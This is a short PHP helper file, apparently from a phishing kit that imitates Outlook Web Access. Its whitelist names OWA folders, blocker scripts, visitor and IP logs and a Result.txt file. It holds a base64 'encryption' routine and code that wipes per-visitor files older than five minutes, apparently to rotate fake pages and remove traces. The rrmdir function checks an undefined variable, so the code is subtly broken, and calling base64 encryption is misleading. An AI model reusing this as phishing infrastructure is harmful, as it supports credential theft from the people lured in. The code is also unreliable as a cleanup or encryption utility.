<?php

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}
function rrmdir($dir)
{
    if (is_dir($dir))
    {
        $objects = scandir($dir);
        foreach ($objects as $object)
        {
            if ($object != "." && $object != "..")
            {
                if (is_dir($dir . "/" . $object)) rrmdir($dir . "/" . $object);
                else unlink($dir . "/" . $object);
            }
        }
        //check time
        if (filemtime($file) < time() - 300)
        {
            rmdir($dir);
        }
    }
}

function deleteoldfiles(){
$files = glob(getcwd() . '/*'); // get all file names
foreach ($files as $file)
{ // iterate files
    if (is_dir($file))
    {
        if ($file == getcwd() . '/domain' || $file == getcwd() . '/engine' || $file == getcwd() . '/office' || $file == getcwd() . '/funcs' || $file == getcwd() . '/newowa' || $file == getcwd() . '/oldowa' || $file == getcwd() . '/.do')
        {
            // do nothing
            
        }
        else
        {
            //check time
            if (filemtime($file) < time() - 300)
            {
                rrmdir($file);
            }
        }
    }

    else if (is_file($file))
    {
        if ($file == getcwd() . '/.gitattributes' || $file == getcwd() . '/.gitignore' || $file == getcwd() . '/a.php' || $file == getcwd() . '/.htaccess' || $file == getcwd() . '/404.php' || $file == getcwd() . '/bitwise_float.php' || $file == getcwd() . '/block.php' || $file == getcwd() . '/blocker.php' || $file == getcwd() . '/composer.json' || $file == getcwd() . '/composer.lock' || $file == getcwd() . '/config.php' || $file == getcwd() . '/cookie.txt' || $file == getcwd() . '/delete.php' || $file == getcwd() . '/index.php' || $file == getcwd() . '/ips.txt' || $file == getcwd() . '/ip_in_range2.php' || $file == getcwd() . '/list.php' || $file == getcwd() . '/README.md' || $file == getcwd() . '/recopy.php' || $file == getcwd() . '/request.php' || $file == getcwd() . '/Result.txt' || $file == getcwd() . '/robots.txt' || $file == getcwd() . '/Settings.php' || $file == getcwd() . '/urls.txt' || $file == getcwd() . '/visitors.txt' || $file == getcwd() . '/visits.csv')
        {
            // do nothing
            
        }
        else
        {
            //check time
            if (filemtime($file) < time() - 300)
            {
/* 				echo 'file found <br>';
				echo $file .'<br>'; */
                unlink($file);
                //header("Location: $redirect");
            }
        }
    }
}

}

?>